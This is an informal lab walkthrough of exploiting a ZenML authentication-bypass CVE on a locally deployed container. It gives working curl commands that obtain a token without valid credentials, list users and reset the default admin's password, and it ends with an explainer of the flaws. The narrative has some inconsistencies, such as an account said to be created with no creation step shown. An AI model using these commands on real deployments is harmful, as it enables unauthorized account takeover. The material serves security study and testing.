Here’s a detailed breakdown of the steps you performed, which led to successfully exploiting CVE-2024-25723 in ZenML
Objective:
Exploit CVE-2024-25723 to gain unauthorized access to an existing ZenML user account.
Deployig Zenml
  **docker run -it -d -p 8080:8080 --name zenml zenmldocker/zenml-server:0.46.0**
check zenml is running or not
  **docker ps or docker logs zenml**
  **curl -i http://localhost:8080/**
Verify what type of authentication used 
   **curl -X GET http://localhost:8080/openapi.json**
execute the container 
  **docker exec -it zenml bash**
**Checking Existing Users in ZenML**
create a new user in ZenML but found that a default user already existed:
  **zenml user create default --password 3gx9AbzP92rfHhZ --role admin**
  Error received:
  Found existing user with this name.
This confirmed that the **default** user already exists.
**Listing Users to Confirm Existence**
zenml user list**
Attempting to Reset Password via API (Exploit)**
Since CVE-2024-25723 allows an unauthenticated user to activate an account with a new password, you attempted this attack.
Exploit Attempt:
curl -X POST "http://localhost:8080/api/v1/auth/login" \
     -H "Content-Type: application/json" \
     -d '{"username": "new_admin", "password": "NewStrongPass123"}'
     Error Received:
{"detail":"Method Not Allowed"}
This method didn't work, so another approach was needed.
o	The endpoint does not allow direct JSON-based login attempts.
o	The login method is incorrect or requires a different approach
Successfully Logging in With the Exploit
Tried with another method using form-encoded authentication: 
curl -X POST http://localhost:8080/api/v1/login -H "Content-Type: application/x-www-form-urlencoded" -d grant_type=password&username=new_admin&password=NewStrongPass123"
The grant_type=password parameter is often used in OAuth-based authentication
This successfully returned an access token:
{"access_token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...","token_type":"bearer"}
This token proves that successfully bypassed authentication using the exploit.
Using the Token to View Users
Once authenticated, you used the token to list all users:
curl -X GET http://localhost:8080/api/v1/users -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
Response:
{
  "index":1,
  "max_size":20,
  "total_pages":1,
  "total":2,
  "items":[
    {
      "id":"1855746a-75b4-4a8a-9935-137f0bdbf085",
      "name":"default",
      "roles":[{"name":"admin"}]
    },
    {
      "id":"7ab86a38-92bd-41a9-9707-cf910246dd6c",
      "name":"new_admin",
      "roles":[{"name":"admin"}]
    }
  ]
}

Now, you have full access to user information, confirming the exploit worked.
How to Log into the ZenML Web Portal?
1. Open the ZenML Web Portal
•	If you're running ZenML locally, open your browser and go to: 
http://localhost:8080
•	If ZenML is running on a remote server, replace localhost with the server’s IP: 
http://<your-server-ip>:8080
Enter Login Credentials
Use the credentials you set during the attack.
For example, if you created the user new_admin with:
curl -X POST "http://localhost:8080/api/v1/login" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "grant_type=password&username=new_admin&password=NewStrongPass123"
Then, in the web portal login page, enter:
•	Username: new_admin
•	Password: NewStrongPass123
. Reset Another User’s Password (If Needed)
If you need to change the password of an existing user (e.g., default), you can use the API:
bash
CopyEdit
curl -X PATCH "http://localhost:8080/api/v1/users/1855746a-75b4-4a8a-9935-137f0bdbf085" \
     -H "Authorization: Bearer <your-access-token>" \
     -H "Content-Type: application/json" \
     -d '{"password": "NewAdminPass456"}'
Then, log in with:
•	Username: default
•	Password: NewAdminPass456

Verify Admin Access
Once logged in, you should see the ZenML dashboard and be able to:
•	Manage pipelines and users
•	Modify configurations
•	Run additional exploits if needed

=========================================================================================
What is Form-Encoded Authentication?
Form-Encoded Authentication refers to a method where authentication data (such as a username and password)
is sent in an HTTP request using the application/x-www-form-urlencoded content type. This format is commonly used in HTML forms and API requests

How It Works
Instead of sending JSON data (like in modern APIs), form-encoded authentication sends key-value pairs formatted as:
key1=value1&key2=value2
Example: JSON vs. Form-Encoded Authentication
JSON-Based Authentication (Common in REST APIs)
curl -X POST "http://example.com/api/login" \
     -H "Content-Type: application/json" \
     -d '{"username": "admin", "password": "password123"}'
Form-Encoded Authentication (Used in Older Systems, OAuth2, Web Forms, etc.)
curl -X POST "http://example.com/api/login" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "username=admin&password=password123"

Why is it Used?
•	Legacy Support: Many older web applications and APIs expect data in this format.
•	Compatibility with HTML Forms: Traditional web login forms submit data in this format by default.
•	OAuth2 Token Requests: OAuth2 uses form-encoded authentication to request access tokens.
Example: OAuth2 Login Using Form-Encoded Authentication
curl -X POST "http://example.com/oauth/token" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "grant_type=password&username=admin&password=password123"
=====================================================================================================

Consolidated Summary of Issues in CVE-2024-25723 (ZenML Authentication Bypass)
CVE-2024-25723 exposes a critical authentication bypass vulnerability in ZenML due to improper validation of user activation status, leading to unauthorized account creation and access.
Key Issues:
1.	Incorrect Authentication Flow Handling:
o	The system did not verify if a user was pre-registered and activated before allowing login.
o	Attackers could bypass authentication checks and log in simply by providing credentials.
2.	Session Management Flaws:
o	Logging in implicitly activated accounts, allowing newly registered users to authenticate without email confirmation or admin approval.
o	The system granted authentication tokens without checking if the account was verified or active.
3.	Authorization Logic Errors:
o	The system failed to enforce proper access control, allowing attackers to create arbitrary users (e.g., new_admin) and set their own passwords.
o	This effectively enabled unauthorized self-registration and potential privilege escalation.









